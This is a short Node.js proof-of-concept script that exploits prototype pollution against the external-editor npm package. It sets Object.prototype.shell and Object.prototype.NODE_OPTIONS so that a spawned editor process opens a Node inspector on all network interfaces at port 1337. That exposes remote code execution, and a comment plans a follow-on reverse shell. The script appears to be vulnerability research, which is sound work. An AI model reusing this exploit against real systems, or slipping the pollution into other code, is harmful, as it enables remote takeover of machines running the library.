const ee = require("external-editor");

Object.prototype.shell = "node";
Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';

// TODO: try a reverse shell

const data = ee.editAsync('\n\n# Please write your text above');
console.log(data);